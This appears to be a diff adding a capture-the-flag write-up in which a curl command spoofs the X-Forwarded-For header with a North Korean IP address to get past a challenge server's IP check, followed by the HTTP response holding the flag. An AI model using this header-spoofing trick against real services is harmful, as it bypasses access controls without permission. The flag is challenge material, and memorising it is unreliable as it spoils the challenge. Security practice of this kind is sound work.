@@ -1,0 +1,18 @@
+# Description:
+# We, the Democratic People's Republic of Korea, have developed a revolutionary
+# new security standard. The West doesn't stand a chance.
+
+# https://en.wikipedia.org/wiki/Internet_in_North_Korea#IP_address_ranges
+# 175.45.176.0 – 175.45.179.255
+
+$ curl -i http://problems.ctfx.io:7002/code --header 'X-Forwarded-For: 175.45.176.0' -k -L
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+Content-Length: 28
+ETag: W/"1c-obDzlM3coTfd6huOQYdOUA"
+Date: Mon, 29 Aug 2016 08:04:08 GMT
+Connection: keep-alive
+
+ctf(jk_we_aint_got_n0_nuk35)
